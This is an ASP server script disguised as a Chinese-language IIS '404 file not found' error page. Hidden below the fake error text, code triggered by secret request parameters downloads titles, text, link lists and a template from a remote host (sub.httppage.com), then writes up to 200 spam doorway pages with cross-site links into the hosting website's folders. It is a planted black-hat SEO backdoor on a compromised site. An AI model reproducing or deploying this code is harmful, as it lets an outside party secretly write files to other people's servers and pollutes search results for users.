<% 
Session.CodePage=65001
Response.Charset="UTF-8"
Server.ScriptTimeOut=9999999 
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<HTML><HEAD><TITLE>无法找到该页</TITLE>
<META http-equiv="Content-Type" content="text/html" charset="UTF-8">
<STYLE type=text/css>BODY {
	FONT: 9pt/12pt 宋体
}
H1 {
	FONT: 12pt/15pt 宋体
}
H2 {
	FONT: 9pt/12pt 宋体
}
A:link {
	COLOR: red
}
A:visited {
	COLOR: maroon
}
</STYLE>

<META content="MSHTML 6.00.2900.3492" name=GENERATOR></HEAD>
<BODY>
<TABLE cellSpacing=10 width=500 border=0>
  <TBODY>
  <TR>
    <TD>
      <H1>无法找到该页</H1>您正在搜索的页面可能已经删除、更名或暂时不可用。 
      <HR>

      <P>请尝试以下操作：</P>
      <UL>
        <LI>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。 
        <LI>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。 
        <LI>单击<A href="javascript:history.back(1)">后退</A>按钮尝试另一个链接。 </LI></UL>
      <H2>HTTP 错误 404 - 文件或目录未找到。<BR>Internet 信息服务 (IIS)</H2>
      <HR>

      <P>技术信息（为技术支持人员提供）</P>
      <UL>
        <LI>转到 <A href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft 
        产品支持服务</A>并搜索包括“HTTP”和“404”的标题。 
        <LI>打开“IIS 帮助”（可在 IIS 管理器 (inetmgr) 
        中访问），然后搜索标题为“网站设置”、“常规管理任务”和“关于自定义错误消息”的主题等等。 
</LI></UL></TD></TR></TBODY></TABLE>
<% 
Response.write   "0<br>"
'用ASP获取远程目标网页指定内容，代码由jz123.cn提供 
'On Error Resume Next 

'Function getHTTPPage(Path, Cset) 
Function getHTTPPage(Path)
	t = GetBody(Path)
	'getHTTPPage = t
	'getHTTPPage=BytesToBstr(t,"GB2312") 
	getHTTPPage=BytesToBstr(t, "UTF-8")
	'getHTTPPage=bytes2BSTR(t)
End Function
Response.write   "0.1<br>"

Function Newstring(wstr,strng) 
	Newstring=Instr(lcase(wstr),lcase(strng)) 
	if Newstring<=0 then Newstring=Len(wstr) 
End Function 

Response.write   "0.2<br>"
Function bytes2BSTR(vIn) 
	strReturn = "" 
	For i = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i = i + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
End Function 

Response.write   "0.3<br>"

Function BytesToBstr(body,Cset) 
	dim objstream 
	set objstream = Server.CreateObject("adodb.stream") 
	objstream.Type = 1 
	objstream.Mode =3 
	objstream.Open 
	objstream.Write body 
	objstream.Position = 0 
	objstream.Type = 2 
	objstream.Charset = Cset 
	BytesToBstr = objstream.ReadText 
	objstream.Close 
	set objstream = nothing 
End Function 

Response.write   "0.4<br>"

Function GetBody(url) 
	on error resume next 
	Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
	With Retrieval 
	.Open "Get", url, False, "", "" 
	.Send 
	GetBody = .ResponseBody
	'GetBody = .ResponseText
	 
	End With 
	Set Retrieval = Nothing 
End Function

Response.write   "0.5<br>"

Function Rand(lowerbound, upperbound)
	'Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min)
	Dim RandomInt
	Randomize
	RandomInt = Int((upperbound - lowerbound + 1) * Rnd + lowerbound)
	Rand = RandomInt
End Function

Response.write   "0.6<br>"

function writeToFile(charset,content,filepath)
		set stm=server.CreateObject("adodb.stream")
		stm.Type=2'以本模式读取
		stm.mode=3
		stm.charset=charset
		stm.open
		stm.WriteText content
		stm.SaveToFile server.MapPath(filepath),2 
		stm.flush
		stm.Close
		set stm=nothing
end function

Response.write   "0.7<br>"

Function CreateMultiFolder(ByVal CFolder) 
		Dim objFSO, PhCreateFolder, CreateFolderArray, CreateFolder 
		Dim i, ii, CreateFolderSub, PhCreateFolderSub, BlInfo 
		BlInfo = False 
		CreateFolder = CFolder 
		'Response.write CreateFolder
		'On Error Resume Next 
		Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
		If Err Then 
				Err.Clear() 
				Exit Function 
		End If 
		If Right(CreateFolder, 1) = "/" Then 
				CreateFolder = Left(CreateFolder, Len(CreateFolder) -1) 
		End If 
		'Response.write CreateFolder
		CreateFolderArray = Split(CreateFolder, "/") 
		'Response.write UBound(CreateFolderArray)
		For i = 0 To UBound(CreateFolderArray) 
				CreateFolderSub = "" 
				For ii = 0 To i 
						CreateFolderSub = CreateFolderSub & CreateFolderArray(ii) & "/" 
						'Response.write CreateFolderSub & "<br>"
				Next 
				'Response.write CreateFolderSub & "<br>"
				PhCreateFolderSub = Server.MapPath(CreateFolderSub) 
				'Response.write PhCreateFolderSub & "<br>"
				If Not objFSO.FolderExists(PhCreateFolderSub) Then 
						objFSO.CreateFolder(PhCreateFolderSub) 
						
				End If 
		Next 
		If Err Then 
				Err.Clear() 
		Else 
				BlInfo = True 
		End If 
		CreateMultiFolder = BlInfo 
End Function

Response.write   "0.8<br>"

Function Pinyin(keyword)
	'Response.write "keyword:" & keyword & "<br>"
	pinyinUrl = "http://sub.httppage.com/wiw/pinyin.php?keyword=" & Server.UrlEncode(keyword) 
	'pinyinUrl = "http://sub.httppage.com/wiw/pinyin.php?keyword=" & (keyword)
	'Response.write "pinyinUrl:" & pinyinUrl & "<br>"
	retPinyin = GetHTTPPage(pinyinUrl)
	'Response.write "ret Pinyin:" & retPinyin & "<br>"
	Pinyin = retPinyin
End Function 

Response.write   "1<br>"

Function Create()
	'on error resume next 
	
	Response.write   "1.1<br>"

	keyword = request("keyword")
	If ( request("in") <> "sub" ) Then
		Response.write   "1.2<br>"
		Response.End
	Else
		Response.write   "1.3<br>"
		If ( keyword = "" Or request("type") = "" ) Then
			Response.write   "keyword ,type, can not empty"
			Response.End
		End if
		
		Response.write   "2<br>"

		baseUrl = "http://sub.httppage.com/wiw/"& keyword & "/"
		Titleline = getHTTPPage( baseUrl & "title.txt")
		Contentline = getHTTPPage(baseUrl & "content.txt")
		Linkline = getHTTPPage(baseUrl & "../link/link.txt")
		Templete = getHTTPPage(baseUrl & "templete.html")
		
		'py = getHTTPPage(pinyinUrl & "?keyword=汽车导航地图哪个好")
		'Response.write py

		'Response.write Titleline & "<br><br>"
		'Response.write Contentline & "<br><br>"
		'Response.write Linkline & "<br><br>"
		'Response.write Templete & "<br><br>"

		Titleline = Split(Titleline,vbcrlf)
		Contentline = split(Contentline,vbcrlf)
		Linkline = split(Linkline,vbcrlf)
		
		TC = ubound(Titleline)
		CC = ubound(Contentline)
		LC = ubound(Linkline)
		
		'Response.write TC & "<br><br>"
		'Response.write CC & "<br><br>"
		'Response.write LC & "<br><br>"
		
		toDir = ""
		otherLinkDir = "/"
		if(request("type") = 2) Then 
			toDir = ("/" & keyword & "/")
		elseif(request("type") = 3) then
			toDir = ("/news/" & keyword & "/")
			otherLinkDir = "/news/"
		else
			Response.write "only 2 or 3"
			Response.End
		End If
		Response.write "toDir:" & toDir & "<br><br>"
		CreateMultiFolder(toDir)
		
		htmlCounts = 200
		Dim chosenTitles 
		chosenTitles = Array() 
		Redim chosenTitles(htmlCounts)
		start = Rand(0, TC)
		If (TC+1 < htmlCounts) Then 
			htmlCounts = TC+1
			chosenTitles = Titleline
		else
			For i = 0 to htmlCounts-1
				start = start mod TC
				chosenTitles(i) = trim(Titleline(start))
				start = start + 1
				Response.write "chosenTitles("&i&") :" & chosenTitles(i)& "<br>"
			next
		End if
		
		Response.write   "3<br>"
	
		chosenTitles(0) = "index"
		'time = Now()
		'time = formatdatetime(now,2)
		'time = "" & NOW
		timeStr = cstr(now)
		'Response.write timeStr & "<br>"
		'Response.write s

		For idx = 0 To htmlCounts-1
			contents = ""
			For i = 0 To 20
				contents = contents & Contentline(Rand(0, CC))
				if( i Mod 3 = 0) Then 
					contents = contents & "<br>"
				End If
			Next 
			
			url = ""
			urlTitle = ""
			
			tab = ""
			For i = 1 to 5
				urlTitle = trim(Titleline(Rand(0, TC)))
				url = "http://" & Linkline(Rand(0, LC))& otherLinkDir & keyword & "/index.html"
				tab = tab & "<li><a href='" & url &"' data-tj='home'>" & urlTitle & "</a></li>"
			Next 

			'Response.write "tab :" & tab & "<br>"


			'//{reference}
			reference = ""
			For i = 1 to 15	
				'urlTitle = trim(Titleline(Rand(0, TC)))
				urlTitle = trim(chosenTitles(Rand(0, htmlCounts-1)))
				if(Rand(0,1) = 0) then
					url = "http://" & Linkline(Rand(0, LC))& otherLinkDir & keyword & "/index.html"'
					urlTitle = trim(Titleline(Rand(0, TC)))
				else
					url = "./" & Pinyin(urlTitle) & ".html"
				End if
				reference = reference & "<li class='layout' id='reference-[" & i &"]-751041-wrap'>"
				reference = reference & "<p class='refUrl'><span class='ref-index'>" & i & ".</span>"
				reference = reference & "<a href='" & url &"' target='_blank'>" & urlTitle & "</a>"
				reference = reference & "</p>"
				reference = reference & "</li>"
			Next 
			'//----
			'Response.write "reference :" & reference & "<br>"

			links_right=""
			For i = 1 to 20	
				'urlTitle = trim(Titleline(Rand(0, TC)))
				urlTitle = trim(chosenTitles(Rand(0, htmlCounts-1)))
				if(Rand(0,1) = 0) Then 
					url = "http://" & Linkline(Rand(0, LC)) &  otherLinkDir & keyword & "/index.html"'
					urlTitle = trim(Titleline(Rand(0, TC)))
				else
					url = "./" & Pinyin(urlTitle) & ".html"
				End If
				
				links_right = links_right & "<dd><a href='" & url &"' target='_blank'>" & urlTitle & "</a></dd>"
			Next

			'//{links_left}
			links_left = ""
			For i = 1 To 10
				'urlTitle = trim(Titleline(Rand(0, TC)))
				urlTitle = trim(chosenTitles(Rand(0, htmlCounts-1)))
				if(Rand(0,1) = 0) Then 
					url = "http://" & Linkline(Rand(0, LC)) & otherLinkDir & keyword & "/index.html"'
					urlTitle = trim(Titleline(Rand(0, TC)))
				Else 
					url = "./" & Pinyin(urlTitle) & ".html"
				links_left = links_left & "<dd class='catalog-item'><a href='" & url & "' class='nslog:1274'>" & urlTitle & "</a></dd>"
				End If 
			Next 
			
			'Title0 = trim(Titleline(Rand(0, TC)))
			Title0 = chosenTitles(idx)
			if( Title0 = "index") Then
				Title0 = trim(Titleline(Rand(0, TC)))
			end if
			Title1 = trim(Titleline(Rand(0, TC)))
			
			Description = ""
			summary = ""
			For i = 0 To 2
				Description = Description & Contentline(Rand(0, CC))
				summary = summary & Contentline(Rand(0, CC))
			Next 

			picurl = "<img width='220' height='253' src='" & baseUrl & "randomPic.php?img=" & Rand(0,100000) & "' alt='" & Title0 & "' />"
			
			moban = Templete

			
			moban = Replace(moban, "{tab}", tab)

			
			moban = Replace(moban, "{pic}", picurl)
			moban = Replace(moban, "{summary}", summary)

			moban = Replace(moban, "{title}", Title0)
			moban = Replace(moban, "{title1}", Title1)
			moban = Replace(moban, "{description}", Description)

			moban = Replace(moban, "{content}", contents)
			moban = Replace(moban, "{timer}", timeStr)

			
			moban = Replace(moban, "{reference}", reference)

			
			moban = Replace(moban, "{links_right}", links_right)
			moban = Replace(moban, "{links_left}", links_left)
			
			Response.write "chosenTitles("&idx&"):" & chosenTitles(idx)& "<br>"
			'Response.write contents & "<br>"
			'Response.write "url:" & pinyinUrl & "?keyword=" & chosenTitles(idx)& "<br>"
			py = Pinyin(chosenTitles(idx))
			'Response.write "get py " & py & "<br>"
			filename = toDir & py & ".html"
			Response.write "begin create " & filename & "<br>"
			
			writeToFile "UTF-8", moban, filename 
		Next

	End If

	Response.write   "4<br>"
End Function

Response.write   "5<br>"

Create 

Response.write   "6<br>"

Response.write Err.Description

%>
</BODY></HTML>